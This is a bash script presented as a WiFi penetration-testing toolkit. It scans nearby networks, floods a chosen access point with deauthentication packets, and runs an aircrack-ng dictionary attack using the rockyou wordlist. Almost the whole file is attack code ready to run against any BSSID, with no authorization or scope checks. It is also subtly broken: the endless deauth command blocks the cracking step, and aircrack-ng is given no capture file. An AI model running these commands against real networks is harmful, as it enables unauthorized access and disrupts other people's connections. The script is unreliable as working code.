#!/bin/bash

# Scans nearby WiFi networks
function scan_networks {
echo "Scanning nearby WiFi networks..."
sudo iwlist wlan0 scan | grep ESSID
}

# Launches a dictionary attack against a target WiFi network
function launch_attack {
echo "Launching dictionary attack..."
sudo aireplay-ng -0 0 -a $1 wlan0
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b $1
}

# Sends deauthentication packets to a target access point
function deauth {
echo "Sending deauthentication packets to $1"
sudo aireplay-ng -0 10 -a $1 wlan0
}

# Displays the help menu
function help_menu {
echo "Usage: wifi-pentest-toolkit.sh [options]"
echo ""
echo "Options:"
echo " -s, --scan Scan nearby WiFi networks"
echo " -a, --attack <BSSID>"
echo " Launch a dictionary attack against a target WiFi network"
echo " -d, --deauth <BSSID>"
echo " Send deauthentication packets to a target access point"
echo " -h, --help Show this help menu"
}

# Parses the command-line arguments
while [[ $# -gt 0 ]]
do
key="$1"
case $key in
-s|--scan)
scan_networks
exit 0
;;
-a|--attack)
BSSID="$2"
launch_attack $BSSID
exit 0
;;
-d|--deauth)
BSSID="$2"
deauth $BSSID
exit 0
;;
-h|--help)
help_menu
exit 0
;;
*)
echo "Unknown option: $key"
help_menu
exit 1
;;
esac
shift
done